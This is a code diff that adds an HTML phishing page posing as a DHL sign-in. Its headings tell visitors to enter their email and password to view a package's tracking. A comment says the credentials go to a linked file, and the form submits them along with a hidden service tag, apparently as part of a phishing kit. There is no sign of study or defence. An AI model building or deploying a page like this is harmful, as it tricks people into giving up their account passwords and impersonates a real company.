@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+
+    <title>Log into DHL</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta name="description" id="description" content="Sign in to DHL.com" />
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="//fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" />
+    <link href="dhl.css" rel="stylesheet" />
+
+  </head>
+  <body tabindex="0">
+
+    <!-- page header -->
+    <header class="dhl-header">
+      <div class="dhl-container">
+        <div class="dhl-header-content">
+          <h1>SIGN IN YOUR EMAIL TO VIEW YOUR TRACKING</h1>
+          <img src="dhl-logo.png" alt="DHL" />
+        </div>
+      </div>
+    </header>
+
+    <!-- form center container -->
+    <main class="dhl-main">
+      <div class="dhl-wrapper">
+
+        <!-- default heading -->
+        <h2 class="dhl-heading">
+          <span>Sign In With Your Correct Email and Password To Review Package Information</span>
+        </h2>
+
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="dhl-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="DHL" />
+
+          <div class="dhl-form-heading">
+            <span class="required">(*)</span> Denotes required field.
+          </div>
+
+          <!-- username input -->
+          <div class="dhl-input dhl-username">
+            <label for="_username"><span class="required">*</span> E-MAIL ID</label>
+            <input type="text" id="_username" name="_username" value="" placeholder="example777@domain.com" />
+          </div>
+
+          <!-- hidden password input -->
+          <div class="dhl-input dhl-password">
+            <label for="_password"><span class="required">*</span> PASSWORD</label>
+            <input type="password" id="_password" name="_password" value="" placeholder="••••••••" />
+          </div>
+
+          <!-- form forgot link -->
+          <div class="dhl-forgot">
+            <a href="#">Forgot password?</a>
+          </div>
+
+          <!-- form action button -->
+          <div class="dhl-action">
+            <button class="btn btn-primary" type="submit">Log In To View</button>
+          </div>
+
+        </form>
+
+      </div>
+    </main>
+
+    <!-- form footer links -->
+    <footer class="dhl-footer">
+      <div class="dhl-container">
+
+        <div class="dhl-footer-copyright">
+          <span>Copyright Notice © 2019 DHL WorldWide Delivery. All rights reserved.</span>
+        </div>
+
+      </div>
+    </footer>
+
+    <!-- form scripts -->
+    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
+    <script src="dhl.js"></script>
+
+  </body>
+</html>
